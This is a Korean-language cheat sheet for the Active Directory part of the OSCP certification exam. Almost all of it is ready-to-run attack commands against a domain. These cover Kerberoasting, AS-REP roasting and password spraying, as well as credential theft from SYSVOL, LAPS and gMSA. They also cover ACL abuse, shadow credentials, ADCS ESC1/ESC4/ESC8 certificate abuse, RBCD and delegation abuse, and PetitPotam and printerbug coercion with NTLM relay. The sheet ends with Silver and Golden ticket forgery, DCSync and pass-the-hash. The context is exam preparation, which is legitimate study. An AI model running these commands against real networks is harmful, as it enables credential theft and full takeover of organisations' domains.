# 07. AD — 40점, 제일 먼저 잡는다

시험 AD는 **assumed breach** — 자격증명 하나(예 `r.andrews:BusyOfficeWorker890`)를 준다. 열거 없이 크리덴셜부터.
목표: WS26 → SRV22 → DC20 각 proof.txt (local.txt 없음). 명령 풀어씀. 원본·전체: [[03. AD 공격 기법]]
⚠️ IP 3대 중 내부망(172.16.x)은 안 닿을 수 있다 → [[05. 피벗]]. 리버트하면 5~7분 대기.

## 0. 준비 — hosts·시간 (Kerberos 에러 90%가 이것)
⚠️ **호스트명마다 «자기» IP를 적는다.** WS26·SRV22·DC20은 서로 다른 머신이다. 한 IP에 다 붙이면 SRV22 접속이 DC로 샌다. 아래는 7월 실측 IP — 회차마다 바뀌니 nmap 결과로 갈아끼운다.
```bash
sudo tee -a /etc/hosts <<'HOSTS'
172.16.142.200  dc20.oscp.exam oscp.exam
172.16.142.202  srv22.oscp.exam
192.168.142.206  ws26.oscp.exam
HOSTS
sudo rdate -n 172.16.142.200              # DC와 시간 동기 (ntpdate 없음). KRB_AP_ERR_SKEW 방지

# ↓↓↓ AD 변수 — 이 파일의 모든 명령이 이 5개만 쓴다 ↓↓↓
export DOMAIN=oscp.exam
export DC=dc20.oscp.exam           # DC «호스트명» (Kerberos·hosts용)
export DCIP=172.16.142.200         # DC «IP» (-dc-ip 플래그·nxc 대상용)
export U=r.andrews
export P='BusyOfficeWorker890'
```
⚠️ **`-dc-ip` 는 언제나 `$DCIP`(=DC의 IP)다.** WS26/SRV22에 붙어 있어도 DC IP를 준다. `$T`(현재 타겟)와 헷갈리지 말 것 — 이 파일은 `$T`를 쓰지 않는다.

## 1. 자격증명 있음 → 즉시 열거 (제공된 크리덴셜로)

```bash
nxc smb $DC -u $U -p $P --rid-brute                      # 유저 열거 → users.txt
rpcclient -U "$DOMAIN/$U%$P" $DC -c enumdomusers
```

## 2. 인증 불필요·저비용 공격 — 항상 먼저
```bash
# Kerberoasting
impacket-GetUserSPNs $DOMAIN/$U:$P -dc-ip $DCIP -request -outputfile kerb.txt
hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt
# AS-REP Roasting (사전인증 꺼진 계정)
impacket-GetNPUsers $DOMAIN/ -usersfile users.txt -no-pass -dc-ip $DCIP -request -outputfile asrep.txt
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
# Password Spray — 락아웃 정책 먼저 확인!
nxc smb $DC -u $U -p $P --pass-pol
nxc smb $DC -u users.txt -p 'Season2026!' --continue-on-success
```

## 3. SYSVOL·LDAP 크리덴셜
```bash
# GPP cpassword (Groups.xml 등) — AES 키 공개라 즉시 복호
smbclient //$DC/SYSVOL -U "$DOMAIN\\$U%$P" -c 'recurse; ls'
# 찾으면: gpp-decrypt <cpassword>
nxc ldap $DC -u $U -p $P -M laps                        # LAPS 읽기 가능?
nxc ldap $DC -u $U -p $P --gmsa                          # gMSA (evil-winrm은 'svc$' + -H NThash)
nxc ldap $DC -u $U -p $P -M user-desc                    # AD description/info 필드의 평문 비번
# LDAPS 막히면(ECONNRESET): python3 ~/git/... gMSADumper.py -u $U -p $P -d $DOMAIN -l $DC  (PATH에 없음)
```

## 3b. MSSQL (AD 단골 — SPN에 mssql 보이면)
```bash
nxc mssql $DC -u $U -p $P                                # 접근 확인 (도메인 인증)
impacket-mssqlclient -windows-auth "$DOMAIN/$U:$P"@MSSQL_HOST   # MSSQL_HOST=SPN의 mssql 호스트
# 셸 안에서:
#   enable_xp_cmdshell   → xp_cmdshell 'whoami'   (서비스계정, 보통 SeImpersonate → Potato)
#   EXEC ('SELECT ...') AT [LINKED_SRV]            → 링크드 서버로 측면이동
#   EXECUTE AS LOGIN='sa'                           → 권한상승
```

## 3c. Targeted Kerberoast (GenericWrite/WriteSPN on user)
```bash
# 대상 유저에 가짜 SPN 심고 → 로스트 → 해시 크랙 → SPN 제거 (비번리셋보다 은밀)
python3 targetedKerberoast.py -v -d $DOMAIN -u $U -p $P --request-user TARGET
```

## 4. BloodHound 엣지 → 기법 (새 자격증명 잡을 때마다 재확인)
```bash
# GenericAll/GenericWrite on USER → 비번 리셋
bloodyAD --host $DC -d $DOMAIN -u $U -p $P set password TARGET 'New1!'
net rpc password "TARGET" "New1!" -U "$DOMAIN/$U%$P" -S $DCIP
# on GROUP → 멤버 추가 (Domain Admins면 즉시 승격)
bloodyAD --host $DC -d $DOMAIN -u $U -p $P add groupMember "GROUP" $U
# WriteOwner → 소유권 탈취 후 GenericAll
bloodyAD --host $DC -d $DOMAIN -u $U -p $P set owner TARGET $U
bloodyAD --host $DC -d $DOMAIN -u $U -p $P add genericAll TARGET $U
# Shadow Credentials (AddKeyCredentialLink) → NT해시/TGT
certipy-ad shadow auto -u $U@$DOMAIN -p $P -account TARGET
# GenericWrite on GPO → 로컬 admin (on-host): SharpGPOAbuse --AddLocalAdmin
```

## 5. ADCS — ESC (find가 취약 ESC 번호를 알려줌)
```bash
certipy-ad find -u $U@$DOMAIN -p $P -dc-ip $DCIP -stdout -vulnerable   # ESC1~16 자동 판정
```
| ESC | 조건 | 공격 |
|---|---|---|
| **ESC1** | 템플릿이 SAN 지정 허용 + 인증용 | 아래 req -upn administrator |
| **ESC2** | Any Purpose EKU | 발급 후 아무 용도로 |
| **ESC3** | Enrollment Agent | 대리 등록 → 타인 인증서 |
| **ESC4** | 템플릿에 쓰기권한 | 템플릿을 ESC1로 바꾼 뒤 ESC1 |
| **ESC6** | CA에 EDITF_ATTRIBUTESUBJECTALTNAME2 | 아무 템플릿에 SAN |
| **ESC8** | 웹 등록(HTTP) 활성 | ntlmrelayx → CA 릴레이 (Coerce와 조합) |
```bash
# ESC1 (시험 핵심): SAN에 administrator 지정 발급 → 인증
certipy-ad req -u $U@$DOMAIN -p $P -dc-ip $DCIP -ca CA-NAME -template VulnTemplate -upn administrator@$DOMAIN
# CA가 DC와 다르면 -target ca.oscp.exam. CA-NAME·template은 find 결과에서 복사
certipy-ad auth -pfx administrator.pfx -dc-ip $DCIP          # → NT해시 / TGT
# ESC4: certipy-ad template -template T -write ... 로 ESC1화 후 위 req
# ESC8: certipy-ad relay -target http://CA/certsrv/certfnsh.asp -template DomainController  (+ Coerce)
```

## 7. 위임 (Delegation)
```bash
# 위임 걸린 계정/컴퓨터 찾기
nxc ldap $DC -u $U -p $P --trusted-for-delegation
```
### RBCD (Resource-Based) — GenericAll/GenericWrite on computer 잡았을 때
```bash
nxc ldap $DC -u $U -p $P -M maq                          # 머신계정 생성권(MachineAccountQuota, 기본 10)
impacket-addcomputer -computer-name 'EVIL$' -computer-pass 'Evil123!' -dc-ip $DCIP "$DOMAIN/$U:$P"
# LDAPS 막히면 -method SAMR 추가. 평문 대신 해시면 -hashes :NTHASH
impacket-rbcd -delegate-from 'EVIL$' -delegate-to 'TARGET$' -action write -dc-ip $DCIP "$DOMAIN/$U:$P"
impacket-getST -spn 'cifs/target.oscp.exam' -impersonate Administrator -dc-ip $DCIP "$DOMAIN/EVIL\$:Evil123!"
export KRB5CCNAME=$(ls -t *.ccache | head -1)      # 파일명은 impacket 버전마다 달라 실제 생성물을 잡는다
impacket-psexec -k -no-pass target.oscp.exam
```
### Constrained Delegation — msDS-AllowedToDelegateTo 걸린 계정 잡았을 때
```bash
# 그 계정으로 허용된 서비스에 임의 사용자(Administrator) 사칭
impacket-getST -spn 'cifs/target.oscp.exam' -impersonate Administrator -dc-ip $DCIP $DOMAIN/svc_user -hashes :NThash
```
### Unconstrained Delegation — 위임 걸린 컴퓨터에 SYSTEM 있을 때
```bash
# DC를 강제 인증시켜 DC$ TGT 캡처 → PtT → DCSync
# 1) on-host: Rubeus.exe monitor /interval:5 /nowrap   (티켓 대기)
# 2) DC 강제인증:
python3 printerbug.py $DOMAIN/$U:$P@$DCIP COMPROMISED_HOST_FQDN
# 3) 캡처한 DC$ TGT로 secretsdump -k -no-pass DC -just-dc
```

## 8. 티켓 위조 (Silver / Golden)

### Silver Ticket — 서비스 계정 해시로 «그 서비스»에 위조 (privesc)
서비스계정 NThash + 도메인SID + SPN 있으면 DC 안 거치고 그 서비스 관리자 사칭.
```bash
# 도메인 SID 확인: impacket-lookupsid $DOMAIN/$U:$P@$DCIP | grep 'Domain SID'
impacket-ticketer -nthash SVC_NTHASH -domain-sid DOMAIN_SID -domain $DOMAIN \
  -spn cifs/srv22.oscp.exam -user-id 500 Administrator
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass srv22.oscp.exam         # 대상 서비스에 -k 로
```
- SPN을 서비스에 맞춰라: `cifs/`(파일·psexec) · `mssql/`(DB) · `http/`(웹) · `host/`(다수)

### Golden Ticket — krbtgt 해시로 «도메인 전체» (지속성, DA 이후)
⚠️ krbtgt 해시가 필요 = 이미 DCSync/DA 달성 후. privesc가 아니라 **지속성**이다.
```bash
# krbtgt 해시·SID 얻기 (DCSync 후)
impacket-secretsdump -just-dc-user krbtgt $DOMAIN/$U:$P@$DCIP
impacket-ticketer -nthash KRBTGT_NTHASH -domain-sid DOMAIN_SID -domain $DOMAIN Administrator
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass dc20.oscp.exam
```

## 9. 도메인 장악 마무리 (DCSync → PtH/PtT)
```bash
# DCSync — 복제권 확보 후 (WriteDacl/GenericAll on domain, 또는 DA)
bloodyAD --host $DC -d $DOMAIN -u $U -p $P add dcsync $U    # 권한 없으면 스킵
impacket-secretsdump -just-dc $DOMAIN/$U:$P@$DCIP          # 전체 해시 (administrator·krbtgt 포함)
```
```bash
# Pass-the-Hash — NThash로 이동
evil-winrm -i $DCIP -u administrator -H NTHASH
impacket-psexec -hashes :NTHASH $DOMAIN/administrator@$DCIP
impacket-wmiexec -hashes :NTHASH $DOMAIN/administrator@$DCIP
nxc smb 172.16.142.0/24 -u administrator -H NTHASH --continue-on-success   # 어디서 admin인지
```
```bash
# Overpass-the-Hash — 해시만 있는데 Kerberos(-k)로 붙어야 할 때
impacket-getTGT $DOMAIN/administrator -hashes :NTHASH -dc-ip $DCIP
export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass dc20.oscp.exam
# Pass-the-Ticket — 이미 .ccache 있으면 export KRB5CCNAME 후 -k -no-pass
```

## 9b. Coerce(강제인증) + Relay + 트러스트
```bash
# 강제인증 — DC/서버가 내게 인증하게 (unconstrained·ESC8·relay와 조합)
python3 PetitPotam.py -u $U -p $P $LHOST $DCIP            # MS-EFSRPC ($LHOST=릴레이/캡처 리스너)
python3 dfscoerce.py -u $U -p $P $LHOST $DCIP             # MS-DFSNM
python3 printerbug.py $DOMAIN/$U:$P@$DCIP $LHOST          # MS-RPRN (Spooler)
nxc smb $DCIP -u $U -p $P -M coerce_plus                  # 강제인증 벡터 스캔
```
```bash
# Relay — Coerce로 유발한 인증을 다른 서비스로 릴레이 (⚠️ 포이즈닝 아님=허용, 범위확인)
impacket-ntlmrelayx -t ldaps://$DCIP --escalate-user $U   # → RBCD/Shadow Cred
impacket-ntlmrelayx -t http://CA/certsrv/certfnsh.asp --adcs --template DomainController  # ESC8
```
```bash
# 트러스트 (자식→부모 도메인, DA 이후 EA로)
nxc ldap $DC -u $U -p $P -M enum_trusts
# 자식 DA면 부모의 krbtgt/Enterprise Admin으로: SID history 넣은 Golden (ExtraSids)
impacket-ticketer -nthash CHILD_KRBTGT -domain-sid CHILD_SID -domain child.dom \
  -extra-sid PARENT_SID-519 Administrator
# timeroasting: 인증 안 걸린 컴퓨터계정 시간응답 크랙 (RID+해시)
```

## 10. Double-Hop (evil-winrm에서 DC에 인증 안 넘어감 — 꼭 알 것)
```powershell
# 증상: 셸에선 자격증명 맞는데 다른 자원에 "Access Denied"
$p=ConvertTo-SecureString 'PASS' -AsPlainText -Force
$c=New-Object System.Management.Automation.PSCredential('oscp.exam\USER',$p)
Invoke-Command -ComputerName dc20 -Credential $c -ScriptBlock {whoami}
# 또는 Kali에서 -k/PtH로 직접 붙기 (evil-winrm 안 거침)
```

## 11. 막히면 이 순서
자격증명 1개 → BloodHound + Kerberoast + AS-REP → **엣지를 기법으로**(4절) → 측면이동 → **새 자격증명 무조건 재투입** → DCSync/DA.

| 에러 | 해결 |
|---|---|
| `KRB_AP_ERR_SKEW` | `sudo rdate -n <DC IP>` 로 DC와 시간 동기 |
| `KDC_ERR_S_PRINCIPAL_UNKNOWN` | hosts에 FQDN 등록 |
| `No route to host` | 내부망 → [[05. 피벗]] |
| `Connection refused` | hosts 틀린 IP (`getent hosts <name>`) |
| LDAPS `ECONNRESET` (gMSA) | `gMSADumper.py` (389 sealing) |

⚠️ **Responder 포이즈너 기본 실행 = 시험 금지.** 강제인증 캡처는 `impacket-smbserver` 로. 릴레이(ntlmrelayx)는 포이즈닝과 달라 허용이나 범위 밖일 수 있음.
